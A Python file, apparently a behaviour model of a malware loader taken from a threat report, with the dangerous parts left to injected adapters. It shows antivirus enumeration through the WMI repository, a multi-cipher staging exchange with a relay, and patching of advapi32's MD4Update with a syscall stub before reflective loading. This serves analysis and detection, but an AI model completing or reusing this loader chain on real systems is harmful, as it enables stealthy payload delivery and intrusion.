"""Behavior model of the reported sequence, using injected test adapters.
The nonstandard crypto layout follows the report, not an interoperability claim.
No active endpoint, payload, implementation of reflective loading or stub bytes.
"""
import ctypes
import hashlib
import struct

def security_products(read_file):
    repository = read_file(r"C:\Windows\System32\wbem\Repository\OBJECTS.DATA")
    return repository.find(b"AntiVirusProduct"), repository.find(b"companyName"), repository.find(b"displayName")

def receive_stage(relay, crypto, native, uid, random_value, profile, syscall_stub):
    relay.exchange(0xF07D6B34, crypto.gost28147_encrypt(profile))
    wrapped_keys = relay.exchange(0xA39CF278, uid)
    public_keys = crypto.aes_cbc_decrypt(wrapped_keys, hashlib.sha256(random_value).digest())
    ciphertexts, secrets = [], []
    for i in range(4):
        ciphertext, shared = crypto.ML_KEM_1024.encapsulate(public_keys[i*1568:(i+1)*1568])
        ciphertexts.append(ciphertext)
        secrets.append(shared)
    response = relay.exchange(0xEF8C0D51, crypto.gost28147_encrypt(b"".join(ciphertexts)))
    tweak = bytes(x ^ 0xA5 for x in uid)
    plain = crypto.threefish_decrypt(response, b"".join(secrets), tweak)
    size = struct.unpack_from("<I", plain)[0]
    parameter, payload = plain[4:4+size], plain[4+size:]
    if len(payload) <= 4096 or payload[:2] != b"MZ":
        raise ValueError("invalid image")
    native.LoadLibraryA(b"jscript9.dll")
    md4 = native.GetProcAddress(native.LoadLibraryA(b"advapi32.dll"), b"MD4Update")
    native.HeapPageAllocator_ProtectPages(md4, len(syscall_stub), 0x40)
    ctypes.memmove(md4, syscall_stub, len(syscall_stub))
    result = native.reflective_map(payload, parameter)
    if result:
        relay.exchange(0xCB790A25, uid)
    return result
